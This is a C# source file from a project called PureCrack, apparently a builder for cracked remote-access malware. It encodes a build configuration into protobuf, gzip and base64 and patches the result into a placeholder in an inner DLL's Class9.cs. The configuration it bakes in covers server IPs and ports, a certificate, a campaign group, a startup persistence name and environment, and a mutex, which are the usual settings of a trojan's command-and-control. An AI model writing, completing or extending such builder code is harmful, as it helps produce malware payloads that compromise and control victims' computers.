using System;
using PureCrack.Crypto;
using PureCrack.Wire;

namespace PureCrack.Build;

/// <summary>
/// Encodes a <see cref="BuildConfig"/> into the on-the-wire shape the inner
/// DLL's <c>Class9</c> expects to find baked in:
///
///   GClass3 body   = field-by-field protobuf-net encoding of the config
///   GClass2 wrap   = ProtoInclude(38) — i.e. tag(38, length-delimited) + GClass3
///   compress       = gzip
///   transport      = base64 string substituted into Class9.cs at build time
///
/// The substitution placeholder in Class9.cs is the base64 of an empty gzip
/// stream — visible as "H4sIAAAA..." in the source. We replace it verbatim
/// with the encoded build-config string.
/// </summary>
public static class InnerProto
{
    /// <summary>The empty-gzip-base64 string sitting in Class9.cs awaiting substitution.</summary>
    public const string Placeholder = "H4sIAAAAAAAACgMAAAAAAAAAAAA=";

    /// <summary>
    /// Encode just the GClass3 fields. Order matches the field number
    /// ascending — protobuf-net's reader is order-insensitive, but matching
    /// the original layout keeps captured-vs-built diffs trivial to compare.
    /// </summary>
    public static byte[] EncodeGClass3(BuildConfig cfg)
    {
        // Concatenate field bytes. ~10 fields, total < 1 KB.
        // Using a List<byte> keeps the code readable; perf is not a concern.
        var parts = new System.Collections.Generic.List<byte[]>();

        foreach (var ip in cfg.Ips)
            parts.Add(ProtoNet.FString(1, ip));

        foreach (var port in cfg.Ports)
            parts.Add(ProtoNet.FInt(2, port));

        if (!string.IsNullOrEmpty(cfg.CertPfxBase64))
            parts.Add(ProtoNet.FString(3, cfg.CertPfxBase64));

        if (!string.IsNullOrEmpty(cfg.Group))
            parts.Add(ProtoNet.FString(4, cfg.Group));

        parts.Add(ProtoNet.FBool(5, cfg.B0));
        parts.Add(ProtoNet.FBool(6, cfg.B1));

        if (!string.IsNullOrEmpty(cfg.StartupName))
            parts.Add(ProtoNet.FString(7, cfg.StartupName));

        if (!string.IsNullOrEmpty(cfg.StartupEnv))
            parts.Add(ProtoNet.FString(8, cfg.StartupEnv));

        if (!string.IsNullOrEmpty(cfg.Mutex))
            parts.Add(ProtoNet.FString(9, cfg.Mutex));

        parts.Add(ProtoNet.FBool(10, cfg.B2));

        var total = 0;
        foreach (var p in parts) total += p.Length;
        var output = new byte[total];
        var off = 0;
        foreach (var p in parts)
        {
            Buffer.BlockCopy(p, 0, output, off, p.Length);
            off += p.Length;
        }
        return output;
    }

    /// <summary>
    /// Wrap GClass3 as the GClass2 ProtoInclude(38) sub-message that the
    /// inner DLL's deserialiser expects to see at the top level.
    /// </summary>
    public static byte[] WrapAsGClass2(byte[] gclass3Body) =>
        ProtoNet.FSub(38, gclass3Body);

    /// <summary>
    /// Full pipeline: encode → wrap → gzip → base64. Substitute the result
    /// directly into Class9.cs at the placeholder.
    /// </summary>
    public static string EncodeAndPackage(BuildConfig cfg)
    {
        var gc3 = EncodeGClass3(cfg);
        var wire = WrapAsGClass2(gc3);
        var gz = Symmetric.Gzip(wire);
        return Convert.ToBase64String(gz);
    }
}
